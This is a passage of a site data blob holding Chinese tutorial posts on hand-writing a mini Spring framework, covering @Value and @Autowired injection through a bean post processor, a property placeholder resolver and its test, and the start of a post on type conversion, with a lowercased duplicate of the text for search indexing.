registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n            addSingleton(beanName, bean);\n        }\n        return bean;\n    }\n\n    protected void applyBeanPostProcessorsBeforeApplyingPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        for (BeanPostProcessor beanPostProcessor : getBeanPostProcessors()) {\n            if (beanPostProcessor instanceof InstantiationAwareBeanPostProcessor) {\n                PropertyValues pvs = ((InstantiationAwareBeanPostProcessor) beanPostProcessor)\n                        .postProcessPropertyValues(beanDefinition.getPropertyValues(), bean, beanName);\n                if (pvs != null) {\n                    for (PropertyValue propertyValue : pvs.getPropertyValues()) {\n                        beanDefinition.getPropertyValues().addPropertyValue(propertyValue);\n                    }\n                }\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# 测试\n\n * xml 准备，spring-component-scan-autowired-value.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemaLocation="http://www.springframework.org/schema/context">\n\n    \x3c!--  ↓↓ spring @Component 测试 ↓↓ --\x3e\n\n    \x3c!--  指定包扫描路径  --\x3e\n    <context:component-scan base-package="com.snail.springframework.beans.factory.bean"/>\n\n    \x3c!--  配置属性表达式解析器  --\x3e\n    <bean class="com.snail.springframework.beans.factory.PropertyPlaceholderConfigurer">\n        <property name="location" value="classpath:spring-component-property.properties"></property>\n    </bean>\n\n    <bean class="com.snail.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor"/>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * 配置文件，spring-component-property.properties。\n\ncatServiceNameFromPropertyPlaceholder=cat001\n\n\n1\n\n\n * 提前准备，指定包下带注解的类。\n   \n   CatService\n\npackage com.snail.springframework.beans.factory.bean;\n\nimport com.snail.springframework.beans.factory.annotation.Autowired;\nimport com.snail.springframework.beans.factory.annotation.Value;\nimport com.snail.springframework.stereotype.Component;\n\nimport java.util.Random;\n\n@Component("catServiceTest")\npublic class CatService implements Animal {\n\n    @Value("${catServiceNameFromPropertyPlaceholder}")\n    private String catServiceNameFromPropertyPlaceholder;\n\n    @Autowired\n    private CatDao catDao;\n\n    @Override\n    public String getAnimalName() {\n        String calls = catDao.queryCalls(new Random().nextInt(4));\n        return catServiceNameFromPropertyPlaceholder + " --\x3e " + calls;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nCatDao\n\npackage com.snail.springframework.beans.factory.bean;\n\nimport com.snail.springframework.stereotype.Component;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Component\npublic class CatDao {\n\n    private static Map<Integer, String> hashMap = new HashMap<>();\n\n    static {\n        hashMap.put(1, "喵！");\n        hashMap.put(2, "喵！喵！");\n        hashMap.put(3, "喵！喵！喵！");\n    }\n\n    public String queryCalls(int number) {\n        return hashMap.get(number);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n * 测试类\n\npublic class SpringComponentPropertyTest {\n\n    /**\n     * 测试从指定包下扫描 @Component 注解\n     * 注入 @Autowired 和 @Value\n     */\n    @Test\n    public void test_scan_component_autowired_value() {\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring-component-scan-autowired-value.xml");\n        CatService catService = applicationContext.getBean("catServiceTest", CatService.class);\n        for (int i = 0; i < 3; i++) {\n            System.out.println("测试结果：" + catService.getAnimalName());\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * 测试结果\n\n// 测试结果：cat001 --\x3e 喵！\n// 测试结果：cat001 --\x3e 喵！喵！喵！\n// 测试结果：cat001 --\x3e 喵！喵！喵！\n\n\n1\n2\n3\n\n\n\n# 总结\n\n通过向容器中添加属性表达式解析器，使容器具备解析 @Value 的能力。\n\n修改 bean 的创建过程，在 bean 实例化后，属性赋值前，通过 InstantiationAwareBeanPostProcessor#postProcessPropertyValues() 修改 bean 的属性值。\n\nAutowiredAnnotationBeanPostProcessor 实现了 InstantiationAwareBeanPostProcessor，真正处理 @Autowired、@Value等注解。',normalizedContent:' * 解析\n * 通过注解注入属性\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n不妨先想一下，在 spring 流程中的哪一步，可以实现通过注解给 bean 注入属性，或者说什么时候或者有哪个切入点可以支持我们修改。\n\n没错，在 bean 生命周期中 dogetbean() -> createbean()，有实例化，属性填充，初始化这么几步。\n\n改造流程肯定是在 实例化和属性填充之间，在设置 bean 属性之前，允许通过 beanpostprocessor 修改属性值。\n\n\n# 通过注解注入属性\n\n核心：在 bean 实例化之后，设置属性之前，允许通过 beanpostprocessor 修改属性值。\n\n\n# 定义一些职责和能力\n\n 1. 修改 instantiationawarebeanpostprocessor，添加扩展点postprocesspropertyvalues()。凡是实现这个接口方法的，都可以在 bean 实例化之后，设置属性之前，修改属性值。\n\n/**\n * instantiationawarebeanpostprocessor 接口的主要作用在于：目标对象的实例化过程中需要处理的事情，包括实例化对象的前后过程以及实例的属性设置\n */\npublic interface instantiationawarebeanpostprocessor extends beanpostprocessor {\n\n    /**\n     * 后置处理属性值\n     *\n     * @param pvs      一个 bean 的所有字段及值\n     * @param bean     bean\n     * @param beanname bean名称\n     * @return {@link propertyvalues}\n     */\n    propertyvalues postprocesspropertyvalues(propertyvalues pvs, object bean, string beanname);\n\n    /**\n     * 在目标对象实例化之前调用，该方法的返回值类型是object，我们可以返回任何类型的值。\n     * 由于这个时候目标对象还未实例化，所以这个返回值可以用来代替原本该生成的目标对象的实例(比如代理对象)。\n     * 如果该方法的返回值代替原本该生成的目标对象，后续只有postprocessafterinitialization方法会调用，其它方法不再调用；否则按照正常的流程走。\n     */\n    object postprocessbeforeinstantiation(class<?> beanclass, string beanname) throws beansexception;\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n 2. 相关属性注解\n\n@target({elementtype.field, elementtype.method, elementtype.constructor})\n@retention(retentionpolicy.runtime)\n@documented\npublic @interface autowired {\n\n}\n\n@target({elementtype.field, elementtype.method, elementtype.parameter, elementtype.type, elementtype.annotation_type})\n@retention(retentionpolicy.runtime)\n@documented\n@inherited\npublic @interface qualifier {\n\n    string value() default "";\n\n}\n\n@target({elementtype.field, elementtype.method, elementtype.parameter})\n@retention(retentionpolicy.runtime)\n@documented\npublic @interface value {\n\n    /**\n     * the actual value expression: e.g. "${systemproperties.myprop}".\n     */\n    string value();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n 3. stringvalueresolver，字符串解析器，实现这个接口的类都注入到容器中，方便解析 @value 使用。\n\npublic interface stringvalueresolver {\n\n    /**\n     * 解析字符串值\n     *\n     * @param value 要解析的字段的属性值\n     * @return {@link string} 替换后的值\n     */\n    string resolvestringvalue(string value);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 4. 修改接口 configurablebeanfactory，支持向容器中添加stringvalueresolver，使容器支持解析属性值。\n\n/**\n * 扩展 beanfactory 接口，支持设置父级容器、自自定义作用域、添加 bean 后置处理器、设置 bean 的初始化和销毁回调方法等\n *\n * @author zhangpengjun\n * @date 2023/3/21\n */\npublic interface configurablebeanfactory extends hierarchicalbeanfactory, singletonbeanregistry {\n\n    string scope_singleton = "singleton";\n    string scope_prototype = "prototype";\n\n    void addbeanpostprocessor(beanpostprocessor beanpostprocessor);\n\n    /**\n     * 为嵌入式值（例如注释属性）添加字符串解析器\n     */\n    void addembeddedvalueresolver(stringvalueresolver valueresolver);\n\n    /**\n     * 解析给定的嵌入式值，例如一个注解属性\n     */\n    string resolveembeddedvalue(string value);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 具体的实现\n\n 1. 修改 abstractbeanfactory，使容器具备添加字符串解析器，和解析字符串表达式的能力。\n\npublic abstract class abstractbeanfactory extends factorybeanregistrysupport implements configurablebeanfactory {\n\n    /**\n     * 字符串解析器，应用于注解属性值（替换@value的值）\n     */\n    private final list<stringvalueresolver> embeddedvalueresolvers = new arraylist<>();\n\n    @override\n    public void addembeddedvalueresolver(stringvalueresolver valueresolver) {\n        this.embeddedvalueresolvers.add(valueresolver);\n    }\n\n    @override\n    public string resolveembeddedvalue(string value) {\n        string result = value;\n        for (stringvalueresolver resolver : this.embeddedvalueresolvers) {\n            result = resolver.resolvestringvalue(result);\n        }\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 2. propertyplaceholderconfigurer，stringvalueresolver 的实现，支持属性值的解析。并向容器中添加字符串解析器，供容器具备解析 @value 的能力。\n\n/**\n * bean对象 占位符处理 <br/>\n * 从给定的配置文件加载占位符的 key value。\n * 在 bean 实例化之前，替换 xml 配置的属性表达式。\n * 在 bean 实例化之后，属性赋值之前，替换 @value 配置的属性表达式。\n *\n * @author zhangpengjun\n * @date 2023/9/13\n */\npublic class propertyplaceholderconfigurer implements beanfactorypostprocessor {\n\n    /**\n     * 默认占位符前缀\n     */\n    public static final string default_placeholder_prefix = "${";\n\n    /**\n     * 默认占位符后缀\n     */\n    public static final string default_placeholder_suffix = "}";\n\n    private string location;\n\n    @override\n    public void postprocessbeanfactory(configurablelistablebeanfactory beanfactory) {\n        // 加载属性文件\n        defaultresourceloader resourceloader = new defaultresourceloader();\n        properties properties = new properties();\n        try {\n            properties.load(resourceloader.getresource(location).getinputstream());\n        } catch (ioexception e) {\n            throw new beansexception("could not load properties", e);\n        }\n\n        // 遍历所有bean的属性值，符合规则的替换\n        string[] beandefinitionnames = beanfactory.getbeandefinitionnames();\n        for (string beanname : beandefinitionnames) {\n            beandefinition beandefinition = beanfactory.getbeandefinition(beanname);\n            propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n            for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                object value = propertyvalue.getvalue();\n                if (!(value instanceof string)) {\n                    continue;\n                }\n                string strvalue = (string) value;\n                strvalue = resolveplaceholder(strvalue, properties);\n                propertyvalues.addpropertyvalue(new propertyvalue(propertyvalue.getname(), strvalue));\n            }\n        }\n\n        // 向容器中添加字符串解析器，供解析@value使用\n        stringvalueresolver valueresolver = new placeholderresolvingstringvalueresolver(properties);\n        beanfactory.addembeddedvalueresolver(valueresolver);\n    }\n\n    private static string resolveplaceholder(string strvalue, properties properties) {\n        stringbuilder builder = new stringbuilder(strvalue);\n        int startidx = strvalue.indexof(default_placeholder_prefix);\n        int stopidx = strvalue.indexof(default_placeholder_suffix);\n        if (startidx != -1 && stopidx != -1 && startidx < stopidx) {\n            string key = strvalue.substring(startidx + 2, stopidx);\n            string val = properties.getproperty(key);\n            builder.replace(startidx, stopidx + 1, val);\n        }\n        return builder.tostring();\n    }\n\n    public void setlocation(string location) {\n        this.location = location;\n    }\n\n    private static class placeholderresolvingstringvalueresolver implements stringvalueresolver {\n\n        private final properties properties;\n\n        public placeholderresolvingstringvalueresolver(properties properties) {\n            this.properties = properties;\n        }\n\n        @override\n        public string resolvestringvalue(string value) {\n            return resolveplaceholder(value, properties);\n        }\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n 3. autowiredannotationbeanpostprocessor，instantiationawarebeanpostprocessor#postprocesspropertyvalues() 的实现。处理 @autowired @value 等注解。\n\n/**\n * spring 注解驱动的核心组件之一，处理的bean 的依赖注入，处理的相关的注解有：@autowired @value\n *\n * @author zhangpengjun\n * @date 2023/9/15\n */\npublic class autowiredannotationbeanpostprocessor implements instantiationawarebeanpostprocessor, beanfactoryaware {\n\n    private configurablelistablebeanfactory beanfactory;\n\n    @override\n    public void setbeanfactory(beanfactory beanfactory) {\n        this.beanfactory = (configurablelistablebeanfactory) beanfactory;\n    }\n\n    @override\n    public propertyvalues postprocesspropertyvalues(propertyvalues pvs, object bean, string beanname) {\n        class<?> clazz = bean.getclass();\n        clazz = classutils.iscglibproxyclass(clazz) ? clazz.getsuperclass() : clazz;\n\n        // 处理 @value 注解\n        field[] declaredfields = clazz.getdeclaredfields();\n        for (field field : declaredfields) {\n            value valueannotation = field.getdeclaredannotation(value.class);\n            if (valueannotation != null) {\n                string value = valueannotation.value();\n                value = beanfactory.resolveembeddedvalue(value);\n                beanutil.setfieldvalue(bean, field.getname(), value);\n            }\n        }\n\n        // 处理 @autowired 注解\n        for (field field : declaredfields) {\n            autowired autowiredannotation = field.getannotation(autowired.class);\n            if (autowiredannotation != null) {\n                class<?> fieldtype = field.gettype();\n                object dependentbean = null;\n                qualifier qualifierannotation = field.getdeclaredannotation(qualifier.class);\n                // 优先按照 @qualifier 注入，再按照类型注入\n                if (qualifierannotation != null) {\n                    string dependentbeanname = qualifierannotation.value();\n                    dependentbean = beanfactory.getbean(dependentbeanname, fieldtype);\n                } else {\n                    dependentbean = beanfactory.getbean(fieldtype);\n                }\n                beanutil.setfieldvalue(bean, field.getname(), dependentbean);\n            }\n        }\n\n        return pvs;\n    }\n\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) {\n        return bean;\n    }\n\n    @override\n    public object postprocessafterinitialization(object bean, string beanname) {\n        return bean;\n    }\n\n    @override\n    public object postprocessbeforeinstantiation(class<?> beanclass, string beanname) throws beansexception {\n        return null;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n\n# 将实现加入原有的逻辑中\n\n * 修改 abstractautowirecapablebeanfactory#createbean() 创建 bean 的过程，将逻辑加入原先实例化后，属性赋值之前。\n\npublic abstract class abstractautowirecapablebeanfactory extends abstractbeanfactory implements autowirecapablebeanfactory {\n\n    @override\n    protected object createbean(string beanname, beandefinition beandefinition, object[] args) throws beansexception {\n        object bean = null;\n        try {\n            // 判断是否返回 代理 bean 对象\n            bean = resolvebeforeinstantiation(beanname, beandefinition);\n            if (bean != null) {\n                return bean;\n            }\n            // 实例化\n            bean = createbeaninstance(beanname, beandefinition, args);\n            // 在设置 bean 属性之前，允许 beanpostprocessor 修改属性值（解析@value @autowired等）\n            applybeanpostprocessorsbeforeapplyingpropertyvalues(beanname, bean, beandefinition);\n            // 属性填充\n            applypropertyvalues(beanname, bean, beandefinition);\n            // 添加 bean 的初始化扩展\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("failed to bean:[" + beanname + "] instance", e);\n        }\n        // 添加单例 bean 缓存\n        if (beandefinition.issingleton()) {\n            // 注册实现了 disposablebean 接口的 单例bean 对象，留待容器停止的时候调用。\n            registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n            addsingleton(beanname, bean);\n        }\n        return bean;\n    }\n\n    protected void applybeanpostprocessorsbeforeapplyingpropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        for (beanpostprocessor beanpostprocessor : getbeanpostprocessors()) {\n            if (beanpostprocessor instanceof instantiationawarebeanpostprocessor) {\n                propertyvalues pvs = ((instantiationawarebeanpostprocessor) beanpostprocessor)\n                        .postprocesspropertyvalues(beandefinition.getpropertyvalues(), bean, beanname);\n                if (pvs != null) {\n                    for (propertyvalue propertyvalue : pvs.getpropertyvalues()) {\n                        beandefinition.getpropertyvalues().addpropertyvalue(propertyvalue);\n                    }\n                }\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# 测试\n\n * xml 准备，spring-component-scan-autowired-value.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemalocation="http://www.springframework.org/schema/context">\n\n    \x3c!--  ↓↓ spring @component 测试 ↓↓ --\x3e\n\n    \x3c!--  指定包扫描路径  --\x3e\n    <context:component-scan base-package="com.snail.springframework.beans.factory.bean"/>\n\n    \x3c!--  配置属性表达式解析器  --\x3e\n    <bean class="com.snail.springframework.beans.factory.propertyplaceholderconfigurer">\n        <property name="location" value="classpath:spring-component-property.properties"></property>\n    </bean>\n\n    <bean class="com.snail.springframework.beans.factory.annotation.autowiredannotationbeanpostprocessor"/>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n * 配置文件，spring-component-property.properties。\n\ncatservicenamefrompropertyplaceholder=cat001\n\n\n1\n\n\n * 提前准备，指定包下带注解的类。\n   \n   catservice\n\npackage com.snail.springframework.beans.factory.bean;\n\nimport com.snail.springframework.beans.factory.annotation.autowired;\nimport com.snail.springframework.beans.factory.annotation.value;\nimport com.snail.springframework.stereotype.component;\n\nimport java.util.random;\n\n@component("catservicetest")\npublic class catservice implements animal {\n\n    @value("${catservicenamefrompropertyplaceholder}")\n    private string catservicenamefrompropertyplaceholder;\n\n    @autowired\n    private catdao catdao;\n\n    @override\n    public string getanimalname() {\n        string calls = catdao.querycalls(new random().nextint(4));\n        return catservicenamefrompropertyplaceholder + " --\x3e " + calls;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\ncatdao\n\npackage com.snail.springframework.beans.factory.bean;\n\nimport com.snail.springframework.stereotype.component;\n\nimport java.util.hashmap;\nimport java.util.map;\n\n@component\npublic class catdao {\n\n    private static map<integer, string> hashmap = new hashmap<>();\n\n    static {\n        hashmap.put(1, "喵！");\n        hashmap.put(2, "喵！喵！");\n        hashmap.put(3, "喵！喵！喵！");\n    }\n\n    public string querycalls(int number) {\n        return hashmap.get(number);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n * 测试类\n\npublic class springcomponentpropertytest {\n\n    /**\n     * 测试从指定包下扫描 @component 注解\n     * 注入 @autowired 和 @value\n     */\n    @test\n    public void test_scan_component_autowired_value() {\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring-component-scan-autowired-value.xml");\n        catservice catservice = applicationcontext.getbean("catservicetest", catservice.class);\n        for (int i = 0; i < 3; i++) {\n            system.out.println("测试结果：" + catservice.getanimalname());\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * 测试结果\n\n// 测试结果：cat001 --\x3e 喵！\n// 测试结果：cat001 --\x3e 喵！喵！喵！\n// 测试结果：cat001 --\x3e 喵！喵！喵！\n\n\n1\n2\n3\n\n\n\n# 总结\n\n通过向容器中添加属性表达式解析器，使容器具备解析 @value 的能力。\n\n修改 bean 的创建过程，在 bean 实例化后，属性赋值前，通过 instantiationawarebeanpostprocessor#postprocesspropertyvalues() 修改 bean 的属性值。\n\nautowiredannotationbeanpostprocessor 实现了 instantiationawarebeanpostprocessor，真正处理 @autowired、@value等注解。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 15 - 数据类型转换",frontmatter:{title:"手写 Spring 15 - 数据类型转换",date:"2024-06-05T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-15.html",relativePath:"views/backend/spring-source-15.md",key:"v-72df8c48",path:"/views/backend/spring-source-15.html",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:3},{level:2,title:"数据类型转换",slug:"数据类型转换",normalizedTitle:"数据类型转换",charIndex:9},{level:3,title:"定义一些职责和能力",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力",charIndex:21},{level:3,title:"具体的实现",slug:"具体的实现",normalizedTitle:"具体的实现",charIndex:36},{level:3,title:"将实现加入原有的逻辑中",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中",charIndex:47},{level:3,title:"测试",slug:"测试",normalizedTitle:"测试",charIndex:64},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:70}],excerpt:"<Boxx/>\n",headersStr:"解析 数据类型转换 定义一些职责和能力 具体的实现 将实现加入原有的逻辑中 测试 总结",content:' * 解析\n * 数据类型转换\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n数据类型转接：在配置一个 Bean 时，配置项是 <property name="date" value="2000-10-10 10:10:10"></property>，而 date 字段类型是 Java.util.Date ，这时就需要类型转换器来为完成类型的自动转换了。\n\n\n# 数据类型转换\n\n使容器具备类型转换的能力：在 refresh() 初始化容器上下文的时候，在最后一步 finishBeanFactoryInitialization(beanFactory); 完成 bean 工厂初始化时，也将转换器服务器 ConversionService 注册到容器中，在 getBean() 时使容器具有类型转换的能力。\n\n\n# 定义一些职责和能力\n\n 1. Converter，类型转换处理器\n\npublic interface Converter<S, T> {\n\n    /**\n     * 将类型为 {@code S} 的源对象转换为目标类型 {@code T}\n     *\n     * @param source 来源\n     * @return {@link T}\n     */\n    T convert(S source);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. ConverterFactory，类型转换工厂\n\npublic interface ConverterFactory<S, R> {\n\n    /**\n     * 获取指定转换器，转换器可以把 S 转换为目标类型 T，其中 T 也是 R 的一个实例。\n     *\n     * @param targetType 目标类型\n     * @return {@link Converter}<{@link S}, {@link T}>\n     */\n    <T extends R> Converter<S, T> getConverter(Class<T> targetType);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 3. ConverterRegistry，类型转换器注册器\n\npublic interface ConverterRegistry {\n\n    /**\n     * 添加转换器\n     *\n     * @param converter 转换器\n     */\n    void addConverter(Converter<?, ?> converter);\n\n    /**\n     * 添加转换器\n     *\n     * @param converter 转换器\n     */\n    void addConverter(GenericConverter converter);\n\n    /**\n     * 添加转换器工厂\n     *\n     * @param converterFactory 转换器工厂\n     */\n    void addConverterFactory(ConverterFactory<?, ?> converterFactory);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n 4. GenericConverter，通用转换器接口\n\npublic interface GenericConverter {\n\n    /**\n     * 获取 转换类型对\n     *\n     * @return {@link Set}<{@link ConvertiblePair}>\n     */\n    Set<ConvertiblePair> getConvertibleTypes();\n\n    /**\n     * 转换\n     *\n     * @param source     来源\n     * @param sourceType 源类型\n     * @param targetType 目标类型\n     * @return {@link Object}\n     */\n    Object convert(Object source, Class<?> sourceType, Class<?> targetType);\n\n\n    final class ConvertiblePair {\n        private final Class<?> sourceType;\n        private final Class<?> targetType;\n\n        public ConvertiblePair(Class<?> sourceType, Class<?> targetType) {\n            this.sourceType = sourceType;\n            this.targetType = targetType;\n        }\n\n        public Class<?> getSourceType() {\n            return sourceType;\n        }\n\n        public Class<?> getTargetType() {\n            return targetType;\n        }\n\n        @Override\n        public boolean equals(Object o) {\n            if (this == o) return true;\n            if (o == null || getClass() != o.getClass()) return false;\n            ConvertiblePair that = (ConvertiblePair) o;\n            return Objects.equals(sourceType, that.sourceType) && Objects.equals(targetType, that.targetType);\n        }\n\n        @Override\n        public int hashCode() {\n            return Objects.hash(sourceType, targetType);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n 5. ConversionService，类型转换服务接口\n\npublic interface ConversionService {\n\n    /**\n     * 是否可以转换\n     *\n     * @param sourceType 源类型\n     * @param targetType 目标类型\n     * @return boolean\n     */\n    boolean canConvert(@Nullable Class<?> sourceType, Class<?> targetType);\n\n    /**\n     * 转换\n     *\n     * @param source     源\n     * @param targetType 目标类型\n     * @return {@link T}\n     */\n    <T> T convert(Object source, Class<T> targetType);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 6. 修改 ConfigurableBeanFactory 接口（AbstractBeanFactory为实现），使容器具备类型转换的能力。\n\npublic interface ConfigurableBeanFactory extends HierarchicalBeanFactory, SingletonBeanRegistry {\n\n    /**\n     * 设置类型转换服务\n     */\n    void setConversionService(ConversionService conversionService);\n\n    /**\n     * 获取类型转换服务\n     */\n    @Nullable\n    ConversionService getConversionService();\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 具体的实现\n\n 1. StringToNumberConverterFactory，String 转 数字。\n\npublic class StringToNumberConverterFactory implements ConverterFactory<String, Number> {\n\n\n    @Override\n    public <T extends Number> Converter<String, T> getConverter(Class<T> targetType) {\n        return new StringToNumber<>(targetType);\n    }\n\n    private static final class StringToNumber<T extends Number> implements Converter<String, T> {\n\n        private final Class<T> targetType;\n\n        public StringToNumber(Class<T> targetType) {\n            this.targetType = targetType;\n        }\n\n        @Override\n        @Nullable\n        public T convert(String source) {\n            if (source.isEmpty()) {\n                return null;\n            }\n            return Convert.convert(targetType, source);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n 2. GenericConversionService，通用转换服务\n\npublic class GenericConversionService implements ConversionService, ConverterRegistry {\n\n    private Map<GenericConverter.ConvertiblePair, GenericConverter> converters = new HashMap<>();\n\n    @Override\n    public boolean canConvert(Class<?> sourceType, Class<?> targetType) {\n        GenericConverter converter = getConverter(sourceType, targetType);\n        return converter != null;\n    }\n\n    @Override\n    public <T> T convert(Object source, Class<T> targetType) {\n        Class<?> sourceType = source.getClass();\n        GenericConverter converter = getConverter(sourceType, targetType);\n        return (T) converter.convert(source, sourceType, targetType);\n    }\n\n    @Override\n    public void addConverter(Converter<?, ?> converter) {\n        GenericConverter.ConvertiblePair typeInfo = getRequiredTypeInfo(converter);\n        ConverterAdapter converterAdapter = new ConverterAdapter(typeInfo, converter);\n        for (GenericConverter.ConvertiblePair convertibleType : converterAdapter.getConvertibleTypes()) {\n            converters.put(convertibleType, converterAdapter);\n        }\n    }\n\n    @Override\n    public void addConverter(GenericConverter converter) {\n        for (GenericConverter.ConvertiblePair convertibleType : converter.getConvertibleTypes()) {\n            converters.put(convertibleType, converter);\n        }\n    }\n\n    @Override\n    public void addConverterFactory(ConverterFactory<?, ?> converterFactory) {\n        GenericConverter.ConvertiblePair typeInfo = getRequiredTypeInfo(converterFactory);\n        ConverterFactoryAdapter converterFactoryAdapter = new ConverterFactoryAdapter(typeInfo, converterFactory);\n        for (GenericConverter.ConvertiblePair convertibleType : converterFactoryAdapter.getConvertibleTypes()) {\n            converters.put(convertibleType, converterFactoryAdapter);\n        }\n    }\n\n    /**\n     * 这段代码的作用是获取一个对象的泛型参数类型信息，并返回一个 ConvertPair 对象。\n     * <p>\n     * 代码步骤如下：\n     * 1. 获取对象的所有泛型接口类型。\n     * 2. 将第一个泛型接口类型转换为ParameterizedType类型。\n     * 3. 获取ParameterizedType的实际类型参数。\n     * 4. 将第一个实际类型参数转换为Class类型，作为源类型。\n     * 5. 将第二个实际类型参数转换为Class类型，作为目标类型。\n     * 6. 创建一个ConvertPair对象，使用源类型和目标类型作为参数。\n     * 7. 返回ConvertPair对象。\n     *\n     * @param object 对象\n     * @return {@link GenericConverter.ConvertiblePair}\n     */\n    private GenericConverter.ConvertiblePair getRequiredTypeInfo(Object object) {\n        